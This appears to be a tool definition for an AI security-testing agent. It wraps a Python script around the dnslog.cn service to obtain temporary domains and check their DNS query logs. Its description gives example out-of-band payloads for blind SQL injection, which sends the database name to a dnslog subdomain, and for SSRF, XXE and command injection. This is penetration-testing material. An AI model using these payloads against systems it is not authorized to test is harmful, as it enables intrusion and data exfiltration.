# dnslog

## Overview
- Tool name: `dnslog`
- Enabled in config: `true`
- Executable: `python3`
- Default args: `-c import sys
import requests
import json
import time
import os
import tempfile

if len(sys.argv) < 2:
    sys.stderr.write("Error: missing operation type parameter (get_domain or get_records)\n")
    sys.exit(1)

operation = sys.argv[1]
base_url = "http://dnslog.cn"

# Use temp file to store Cookie
cookie_file = os.path.join(tempfile.gettempdir(), "dnslog_cookie.txt")

# Create session to maintain Cookie
session = requests.Session()

# Load Cookie if file exists
try:
    if os.path.exists(cookie_file):
        with open(cookie_file, 'r') as f:
            for line in f:
                if 'PHPSESSID' in line:
                    session.cookies.set('PHPSESSID', line.strip().split('=')[1])
except:
    pass

try:
    if operation == "get_domain":
        # Get temporary domain (this sets the Cookie)
        response = session.get(f"{base_url}/getdomain.php", timeout=10)
        response.raise_for_status()
        domain = response.text.strip().rstrip('%')
        
        # Save Cookie to file
        try:
            with open(cookie_file, 'w') as f:
                for cookie in session.cookies:
                    f.write(f"{cookie.name}={cookie.value}\n")
        except:
            pass
        
        if domain:
            result = {
                "status": "success",
                "domain": domain,
                "message": f"Successfully obtained temporary domain: {domain}",
                "usage": f"Use this domain for DNS query testing, e.g.: nslookup {domain} or ping http://{domain}",
                "note": "Domain is valid for 24 hours, query records promptly"
            }
            print(json.dumps(result, ensure_ascii=False, indent=2))
        else:
            print(json.dumps({
                "status": "error",
                "message": "Failed to obtain domain, please try again later"
            }, ensure_ascii=False, indent=2))
            sys.exit(1)
    
    elif operation == "get_records":
        # Get DNS query records
        if len(sys.argv) < 3:
            sys.stderr.write("Error: get_records operation requires domain parameter\n")
            sys.exit(1)
        
        domain = sys.argv[2]
        wait_time = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else 0
        
        # Wait if specified
        if wait_time > 0:
            print(f"Waiting {wait_time} seconds before querying records...", file=sys.stderr)
            time.sleep(wait_time)
        
        # Load Cookie if exists
        try:
            if os.path.exists(cookie_file):
                with open(cookie_file, 'r') as f:
                    for line in f:
                        if 'PHPSESSID' in line:
                            session.cookies.set('PHPSESSID', line.strip().split('=')[1])
        except:
            pass
        
        response = session.get(f"{base_url}/getrecords.php", params={"t": domain}, timeout=10)
        response.raise_for_status()
        records_text = response.text.strip().rstrip('%')
        
        if records_text and records_text != "[]" and records_text.strip():
            # Try to parse as JSON
            try:
                records = json.loads(records_text)
                if isinstance(records, list) and len(records) > 0:
                    result = {
                        "status": "success",
                        "domain": domain,
                        "record_count": len(records),
                        "records": records,
                        "message": f"Found {len(records)} DNS query records"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
                else:
                    result = {
                        "status": "no_records",
                        "domain": domain,
                        "records": [],
                        "message": "No DNS query records yet, target may not have triggered DNS query"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
            except json.JSONDecodeError:
                # If not JSON, split by lines
                records = [line.strip() for line in records_text.split("\n") if line.strip() and line.strip() != "[]"]
                if records:
                    result = {
                        "status": "success",
                        "domain": domain,
                        "record_count": len(records),
                        "records": records,
                        "message": f"Found {len(records)} DNS query records"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
                else:
                    result = {
                        "status": "no_records",
                        "domain": domain,
                        "records": [],
                        "message": "No DNS query records"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
        else:
            result = {
                "status": "no_records",
                "domain": domain,
                "records": [],
                "message": "No DNS query records yet, target may not have triggered DNS query"
            }
            print(json.dumps(result, ensure_ascii=False, indent=2))
    
    else:
        sys.stderr.write(f"Error: unknown operation type '{operation}', supported operations: get_domain, get_records\n")
        sys.exit(1)

except requests.RequestException as e:
    error_result = {
        "status": "error",
        "message": f"Request failed: {str(e)}",
        "suggestion": "Check network connection or try again later"
    }
    print(json.dumps(error_result, ensure_ascii=False, indent=2))
    sys.exit(1)
except Exception as e:
    error_result = {
        "status": "error",
        "message": f"Execution error: {str(e)}"
    }
    print(json.dumps(error_result, ensure_ascii=False, indent=2))
    sys.exit(1)
`
- Summary: DNSlog tool for blind injection, SSRF, XXE, and other out-of-band vulnerability verification

## Detailed Description
DNSlog is a DNS query recording tool implemented through the dnslog.cn service. Primarily used to verify out-of-band vulnerabilities such as blind injection, SSRF, XXE, and command injection.

**Key Features:**
- Get temporary domain: Generate a unique temporary domain for DNS query testing
- Query DNS records: Check if any DNS query requests have reached the domain
- Wait time support: Can wait a specified time before querying, useful for asynchronous vulnerability verification

**Use Cases:**
- **Blind SQL injection testing**: Use DNS queries in SQL injection payloads to confirm successful injection
  - Example: `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.dnslog.cn\\abc'))`
- **SSRF vulnerability verification**: Confirm SSRF vulnerability existence through DNS queries
  - Example: `http://target.com/api?url=http://xxx.dnslog.cn`
- **XXE vulnerability verification**: Trigger DNS queries through external entity references
  - Example: `<!ENTITY xxe SYSTEM "http://xxx.dnslog.cn">`
- **Command injection testing**: Use DNS queries in command injection payloads
  - Example: `nslookup xxx.dnslog.cn` or `ping xxx.dnslog.cn`
- **Out-of-band vulnerability verification**: Any situation where you need to confirm if the target executed a specific operation

**Workflow:**
1. Use `operation=get_domain` to get a temporary domain (e.g.: `abc123.dnslog.cn`)
2. Use the domain in vulnerability testing payloads
3. Use `operation=get_records` to query if there are DNS query records
4. If records are found, the vulnerability exists and the payload was executed

**Notes:**
- Temporary domain is valid for 24 hours
- DNS queries may have delays; recommended to wait a few seconds before querying records
- This tool depends on the dnslog.cn service and requires network connectivity
- The tool automatically manages Cookie sessions to ensure the same session is used for domain retrieval and record querying

## Parameters
### `operation`
- Type: `string`
- Required: `true`
- Position: `0`
- Format: `positional`
- Description: Operation type, supports two operations:
- `get_domain`: Get a temporary domain
- `get_records`: Query DNS records

### `domain`
- Type: `string`
- Required: `false`
- Position: `1`
- Format: `positional`
- Description: Domain parameter (only for get_records operation)

### `wait_time`
- Type: `int`
- Required: `false`
- Position: `2`
- Format: `positional`
- Default: `0`
- Description: Wait time in seconds (only for get_records operation)

## Invocation Template
```bash
python3 -c import sys
import requests
import json
import time
import os
import tempfile

if len(sys.argv) < 2:
    sys.stderr.write("Error: missing operation type parameter (get_domain or get_records)\n")
    sys.exit(1)

operation = sys.argv[1]
base_url = "http://dnslog.cn"

# Use temp file to store Cookie
cookie_file = os.path.join(tempfile.gettempdir(), "dnslog_cookie.txt")

# Create session to maintain Cookie
session = requests.Session()

# Load Cookie if file exists
try:
    if os.path.exists(cookie_file):
        with open(cookie_file, 'r') as f:
            for line in f:
                if 'PHPSESSID' in line:
                    session.cookies.set('PHPSESSID', line.strip().split('=')[1])
except:
    pass

try:
    if operation == "get_domain":
        # Get temporary domain (this sets the Cookie)
        response = session.get(f"{base_url}/getdomain.php", timeout=10)
        response.raise_for_status()
        domain = response.text.strip().rstrip('%')
        
        # Save Cookie to file
        try:
            with open(cookie_file, 'w') as f:
                for cookie in session.cookies:
                    f.write(f"{cookie.name}={cookie.value}\n")
        except:
            pass
        
        if domain:
            result = {
                "status": "success",
                "domain": domain,
                "message": f"Successfully obtained temporary domain: {domain}",
                "usage": f"Use this domain for DNS query testing, e.g.: nslookup {domain} or ping http://{domain}",
                "note": "Domain is valid for 24 hours, query records promptly"
            }
            print(json.dumps(result, ensure_ascii=False, indent=2))
        else:
            print(json.dumps({
                "status": "error",
                "message": "Failed to obtain domain, please try again later"
            }, ensure_ascii=False, indent=2))
            sys.exit(1)
    
    elif operation == "get_records":
        # Get DNS query records
        if len(sys.argv) < 3:
            sys.stderr.write("Error: get_records operation requires domain parameter\n")
            sys.exit(1)
        
        domain = sys.argv[2]
        wait_time = int(sys.argv[3]) if len(sys.argv) > 3 and sys.argv[3] else 0
        
        # Wait if specified
        if wait_time > 0:
            print(f"Waiting {wait_time} seconds before querying records...", file=sys.stderr)
            time.sleep(wait_time)
        
        # Load Cookie if exists
        try:
            if os.path.exists(cookie_file):
                with open(cookie_file, 'r') as f:
                    for line in f:
                        if 'PHPSESSID' in line:
                            session.cookies.set('PHPSESSID', line.strip().split('=')[1])
        except:
            pass
        
        response = session.get(f"{base_url}/getrecords.php", params={"t": domain}, timeout=10)
        response.raise_for_status()
        records_text = response.text.strip().rstrip('%')
        
        if records_text and records_text != "[]" and records_text.strip():
            # Try to parse as JSON
            try:
                records = json.loads(records_text)
                if isinstance(records, list) and len(records) > 0:
                    result = {
                        "status": "success",
                        "domain": domain,
                        "record_count": len(records),
                        "records": records,
                        "message": f"Found {len(records)} DNS query records"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
                else:
                    result = {
                        "status": "no_records",
                        "domain": domain,
                        "records": [],
                        "message": "No DNS query records yet, target may not have triggered DNS query"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
            except json.JSONDecodeError:
                # If not JSON, split by lines
                records = [line.strip() for line in records_text.split("\n") if line.strip() and line.strip() != "[]"]
                if records:
                    result = {
                        "status": "success",
                        "domain": domain,
                        "record_count": len(records),
                        "records": records,
                        "message": f"Found {len(records)} DNS query records"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
                else:
                    result = {
                        "status": "no_records",
                        "domain": domain,
                        "records": [],
                        "message": "No DNS query records"
                    }
                    print(json.dumps(result, ensure_ascii=False, indent=2))
        else:
            result = {
                "status": "no_records",
                "domain": domain,
                "records": [],
                "message": "No DNS query records yet, target may not have triggered DNS query"
            }
            print(json.dumps(result, ensure_ascii=False, indent=2))
    
    else:
        sys.stderr.write(f"Error: unknown operation type '{operation}', supported operations: get_domain, get_records\n")
        sys.exit(1)

except requests.RequestException as e:
    error_result = {
        "status": "error",
        "message": f"Request failed: {str(e)}",
        "suggestion": "Check network connection or try again later"
    }
    print(json.dumps(error_result, ensure_ascii=False, indent=2))
    sys.exit(1)
except Exception as e:
    error_result = {
        "status": "error",
        "message": f"Execution error: {str(e)}"
    }
    print(json.dumps(error_result, ensure_ascii=False, indent=2))
    sys.exit(1)
 <operation> <domain> <wait_time>
```

## Model Usage Guidance
- Use this tool only within authorized scope.
- Prefer the narrowest target/argument set before broad scans.
- For long outputs, store results and summarize key findings.
- Validate parameter formats before execution to reduce command errors.
